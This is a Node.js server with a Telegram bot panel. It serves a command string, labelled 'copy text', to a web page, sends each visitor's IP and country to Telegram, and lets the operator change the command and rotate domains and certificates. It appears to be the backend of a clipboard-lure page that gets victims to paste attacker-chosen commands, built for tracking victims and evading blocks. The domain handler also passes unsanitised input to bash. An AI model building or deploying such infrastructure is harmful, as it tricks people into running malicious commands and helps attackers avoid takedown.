import express from "express";
import bodyParser from "body-parser";
import path from "path";
import TelegramBot from "node-telegram-bot-api";
import fs from "fs";
import https from "https";
import dotenv from "dotenv";
import cors from "cors";
import axios from "axios";
import { spawn } from "child_process";

dotenv.config();
const app = express();
const webDirectory = path.join(process.cwd(), "web");

const PORT = process.env.PORT || 443;
const TOKEN = process.env.BOT_TOKEN;
const TG_OWNER_ID = process.env.TG_OWNER_ID;
const DOMAIN_NAME = process.env.DOMAIN_NAME;

const bot = new TelegramBot(TOKEN, { polling: true });

const corsOptions = {
  origin: `https://${DOMAIN_NAME}`,
  methods: ["GET", "POST"],
};

const options = {
  key: fs.readFileSync(`/etc/letsencrypt/live/${DOMAIN_NAME}/privkey.pem`),
  cert: fs.readFileSync(`/etc/letsencrypt/live/${DOMAIN_NAME}/fullchain.pem`),
};

app.use(cors(corsOptions));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.post("/send_data", async (req, res) => {
  const { ip, country } = req.body.userData;
  console.log(ip, country);

  const envFileContent = fs.readFileSync(".env", "utf8");
  const commandMatch = envFileContent.match(/^COMMAND=(.*)$/m);
  const currentCommand = commandMatch ? commandMatch[1] : "No command set";

  const text = `Домен: ${process.env.DOMAIN_NAME}\n📜Текст копирования: ${currentCommand}\nIP адрес: ${ip}\nСтрана: ${country}`;

  try {
    const chatIds = process.env.TG_ID.split(",").map((id) => id.trim());

    res.send({ currentCommand });

    const responses = await Promise.all(
      chatIds.map((chat_id) =>
        axios.post(
          `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
          {
            chat_id,
            text,
          }
        )
      )
    );
  } catch (error) {
    console.error(error.response?.data || error.message);
    res.status(500);
  }
});

app.use(express.static(webDirectory));


function updateEnvFile(newDomain) {
  const envFileContent = fs.readFileSync(".env", "utf8");

  const updatedEnvContent = envFileContent.replace(/^DOMAIN_NAME=[^\n]*/m, `DOMAIN_NAME=${newDomain}`);

  fs.writeFileSync(".env", updatedEnvContent, "utf8");
  console.log(`DOMAIN_NAME успешно обновлен на: ${newDomain}`);
}

function restartApp() {
  const pm2Process = spawn("pm2", ["restart", "app"]);

  pm2Process.stdout.on("data", (data) => {
    console.log(`stdout: ${data}`);
  });

  pm2Process.stderr.on("data", (data) => {
    console.error(`stderr: ${data}`);
  });

  pm2Process.on("close", (code) => {
    if (code === 0) {
      console.log("app.js успешно перезапущен");
    } else {
      console.error(`Ошибка при перезапуске: код ${code}`);
    }
  });
}

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const userMessage = msg.text;

  const chatIdStr = String(chatId);
  const tgOwnerIdStr = String(TG_OWNER_ID);
  
  if (chatIdStr !== tgOwnerIdStr) {
    return console.log(chatIdStr, tgOwnerIdStr);
  }

  const options = {
    reply_markup: {
      keyboard: [[{ text: "Сменить команду" }, { text: "Сменить домен" }]],
      resize_keyboard: true,
      one_time_keyboard: true,
    },
  };

  bot.sendMessage(chatId, "Выберите действие", options);
});

bot.on("message", (msg) => {
  const chatId = msg.chat.id;
  const userMessage = msg.text;

  const chatIdStr = String(chatId);
  const tgOwnerIdStr = String(TG_OWNER_ID);

  if (chatIdStr !== tgOwnerIdStr) {
    return console.log(chatIdStr, tgOwnerIdStr);
  }

  if (userMessage === "Сменить команду") {
    bot.sendMessage(chatId, "Введите новую команду:");

    bot.once("message", (msg) => {
      const newCommand = msg.text;

      let envFileContent = fs.readFileSync(".env", "utf8");
      const newEnvContent = envFileContent.replace(
        /^COMMAND=.*/m,
        `COMMAND=${newCommand}`
      );

      fs.writeFileSync(".env", newEnvContent, "utf8");
      dotenv.config();

      bot.sendMessage(chatId, `📝 Новая команда сохранена: ${newCommand}`);
    });
  }

  if (userMessage === "Сменить домен") {
    bot.sendMessage(chatId, "Введите новый домен:");
  
    bot.once("message", (msg) => {
      const newDomain = msg.text;
  
      if (!newDomain.includes(".")) {
        bot.sendMessage(chatId, "Ошибка: домен должен содержать хотя бы одну точку.");
        return;
      }
  
      const certbotCommand = `sudo certbot certonly --standalone --agree-tos --register-unsafely-without-email --no-eff-email -v --non-interactive -d ${newDomain}`;
  
      const certbotProcess = spawn('bash', ['-c', certbotCommand]);
  
      certbotProcess.stdout.on('data', (data) => {
        const log = data.toString();
        console.log(`stdout: ${log}`);
        bot.sendMessage(chatId, `Логи certbot:\n${log}`);
      });
  
      certbotProcess.stderr.on('data', (data) => {
        const errorLog = data.toString();
        console.error(`stderr: ${errorLog}`);
        bot.sendMessage(chatId, `certbot:\n${errorLog}`);
      });
  
      certbotProcess.on('close', (code) => {
        if (code !== 0) {
          console.error(`certbot завершился с кодом ${code}`);
          bot.sendMessage(chatId, "Не удалось сгенерировать домен. Ошибка.");
        } else {
          updateEnvFile(newDomain);
      
          const deleteCommand = `sudo certbot delete --cert-name ${DOMAIN_NAME} --non-interactive --quiet`;
      
          const deleteProcess = spawn('bash', ['-c', deleteCommand]);
      
          deleteProcess.stdout.on('data', (data) => {
            const log = data.toString();
            console.log(`stdout: ${log}`);
            bot.sendMessage(chatId, `Логи удаления сертификата:\n${log}`);
          });
      
          deleteProcess.stderr.on('data', (data) => {
            const errorLog = data.toString();
            console.error(`stderr: ${errorLog}`);
            bot.sendMessage(chatId, `Ошибка удаления сертификата:\n${errorLog}`);
          });
      
          deleteProcess.on('close', (deleteCode) => {
            if (deleteCode !== 0) {
              console.error(`Ошибка удаления сертификата, код: ${deleteCode}`);
              bot.sendMessage(chatId, "Не удалось удалить старый сертификат.");
            } else {
              console.log("Старый сертификат успешно удален.");
              bot.sendMessage(chatId, `Старый сертификат для домена ${DOMAIN_NAME} удален.`);
            }
      
            bot.sendMessage(chatId, `Новый сертификат успешно сгенерирован для домена: ${newDomain}`);
            restartApp();
          });
        }
      });
    });
  }
  
});

https.createServer(options, app).listen(PORT, "0.0.0.0", () => {
  console.log(`Server is running on domain: ${DOMAIN_NAME}`);
});
